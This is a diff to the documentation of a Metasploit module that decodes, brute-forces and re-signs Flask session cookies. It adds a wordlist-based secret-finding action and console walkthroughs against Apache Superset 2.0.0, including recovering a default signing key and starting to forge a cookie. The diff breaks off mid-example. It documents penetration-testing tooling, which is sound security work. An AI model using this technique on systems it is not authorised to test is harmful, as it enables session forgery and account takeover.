@@ -38,6 +38,10 @@ sudo docker exec -it superset superset init
 
 Retrieve a cookie from an HTTP(s) server
 
+### FindSecret
+
+Using the provided wordlist, find the secret key used to sign the cookie
+
 ### Resign
 
 Resign the specified cookie data
@@ -56,10 +60,15 @@ When action is set to `Resign`, the content of the decoded cookie will be replac
 
 When action is set to `Resign`, the cookie is signed with this secret.
 
+### SECRET_KEYS_FILE
+
+When action is set to `FindSecret`, a file containing secret keys to try. One per line. Defaults to `metasploit-framework/data/wordlists/flask_secret_keys.tx`
 
 ## Scenarios
 
 ### Apache Superset 2.0.0
+
+#### Grab the cookie to make sure its a valid cookie that can be decoded. (Retrieve)
 
 ```
 msf6 > use auxiliary/gather/python_flask_cookie_signer
@@ -76,6 +85,25 @@ msf6 auxiliary(gather/python_flask_cookie_signer) > run
 [*] 192.168.159.128:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZDU2N2U1ZDJmYmU1NDIyOTRlMzFhODU5YWFiMjQ5MTcwMDcyNTNhMyIsImxvY2FsZSI6ImVuIn0.ZPoc7Q.y_slNhIvS7PDX1gKMYpBS1nW0L0
 [*] 192.168.159.128:8088 - Decoded Cookie: {"csrf_token"=>"d567e5d2fbe542294e31a859aab24917007253a3", "locale"=>"en"}
 [*] Auxiliary module execution completed
+```
+
+#### Determine the secret key (FindSecret)
+
+```
+msf6 auxiliary(gather/python_flask_cookie_signer) > set action FindSecret
+action => findsecret
+msf6 auxiliary(gather/python_flask_cookie_signer) > run
+[*] Running module against 127.0.0.1
+
+[*] 127.0.0.1:8088 - Retrieving Cookie
+[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZjNlMjU1MzBkZWNkYjE4YzRkYWMxMTQzODgyYjg1ODlmMWM3YzFjYyIsImxvY2FsZSI6ImVuIn0.ZP9b0w.PjZZJJ1lSiUQPacotJV0zbxX3fU
+[+] 127.0.0.1:8088 - Found secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
+[*] Auxiliary module execution completed
+```
+
+#### Sign a new cookie (Resign)
+
+```
 msf6 auxiliary(gather/python_flask_cookie_signer) > set NEWCOOKIECONTENT '{"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}'
 NEWCOOKIECONTENT => {"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}
 msf6 auxiliary(gather/python_flask_cookie_signer) > set SECRET CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
